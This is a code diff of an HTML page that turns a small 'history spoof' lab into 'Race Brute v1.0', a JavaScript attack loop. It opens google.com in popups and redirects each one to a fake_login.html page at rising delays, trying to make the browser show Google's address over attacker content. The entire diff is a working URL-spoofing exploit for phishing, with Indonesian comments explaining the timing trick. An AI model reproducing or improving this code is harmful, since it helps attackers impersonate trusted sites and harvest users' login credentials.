@@ -3,51 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lab: History Manipulation - FARISSAL B</title>
+    <title>Timing Bruteforce - FARISSAL B</title>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-        .box { background: #1a1a1a; padding: 30px; border-radius: 20px; border: 1px solid #333; width: 85%; }
-        button { background: #ff4b2b; color: white; border: none; padding: 18px; border-radius: 50px; font-weight: bold; width: 100%; cursor: pointer; }
-        .desc { font-size: 12px; color: #9aa0a6; margin-bottom: 20px; }
+        body { background: #000; color: #fff; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .panel { background: #111; border: 1px solid #333; padding: 25px; border-radius: 15px; width: 80%; max-width: 400px; }
+        button { background: #d93025; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-bottom: 15px; }
+        .stat { color: #81c995; font-size: 12px; text-align: left; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h2>Research: History Spoof</h2>
-    <p class="desc">Teknik: Race Condition Navigasi</p>
+<div class="panel">
+    <h2 style="color: #8ab4f8; margin-top:0;">Race Brute v1.0</h2>
+    <p style="font-size: 11px; color: #9aa0a6;">Target: google.com Origin Spoofing</p>
     
-    <button id="exploitBtn">TEST SPOOFING</button>
+    <button id="bruteBtn">START ATTACK LOOP</button>
     
-    <p id="status" style="margin-top:20px; font-family:monospace; color:#0f0; font-size:11px;"></p>
+    <div id="status" class="stat">> System idle...</div>
 </div>
 
 <script>
-    const btn = document.getElementById('exploitBtn');
     const status = document.getElementById('status');
+    const log = (m) => { status.innerHTML = `> ${m}<br>` + status.innerHTML; };
 
-    btn.addEventListener('click', () => {
-        status.innerText = "Membuka jendela...";
+    // Target yang mau dipalsukan URL-nya
+    const TARGET_ORIGIN = "https://www.google.com";
+    // Halaman lo yang berisi konten palsu
+    const ATTACKER_PAGE = window.location.href + "fake_login.html";
 
-        // 1. Buka jendela baru (target spoofing: google.com)
-        const spoofWin = window.open("https://www.google.com", "SpoofWindow", "width=500,height=600");
+    let delay = 50; // Mulai dari 50ms
 
-        if (spoofWin) {
-            status.innerText = "Jendela terbuka. Menunggu race condition...";
+    document.getElementById('bruteBtn').addEventListener('click', () => {
+        log("Starting Bruteforce Attack...");
+        
+        // Loop 10 kali percobaan dengan timing berbeda
+        let count = 0;
+        const interval = setInterval(() => {
+            if (count >= 10) {
+                clearInterval(interval);
+                log("Attack batch finished.");
+                return;
+            }
 
-            // 2. Trik utamanya: Tunggu sebentar pas lagi loading (timing sangat krusial!)
-            setTimeout(() => {
-                // 3. Paksa jendela tersebut pindah ke halaman kita kembali
-                // Tapi karena proses navigasi google.com masih jalan, 
-                // Chrome kadang "nyangkut" nampilin URL Google padahal isinya web kita.
-                spoofWin.location.href = window.location.href + "?content=malicious";
+            log(`Trying with delay: ${delay}ms...`);
+            
+            // 1. Buka Target
+            const win = window.open(TARGET_ORIGIN, "_blank", "width=400,height=500");
+
+            if (win) {
+                // 2. Kirim perintah navigasi balik tepat di tengah proses loading
+                setTimeout(() => {
+                    try {
+                        win.location.href = ATTACKER_PAGE;
+                    } catch(e) {}
+                }, delay);
                 
-                status.innerText = "Exploit dikirim. Cek bar alamat di jendela baru!";
-            }, 500); // 500ms adalah angka rata-rata, bisa lo ganti-ganti (200-800ms)
-
-        } else {
-            alert("Pop-up diblokir! Izinkan pop-up dulu di pojok kanan atas browser.");
-        }
+                delay += 50; // Naikin jeda buat percobaan berikutnya
+                count++;
+            } else {
+                log("ERROR: Pop-up blocked!");
+                clearInterval(interval);
+            }
+        }, 2000); // Jeda tiap buka jendela baru biar gak nge-hang
     });
 </script>
 
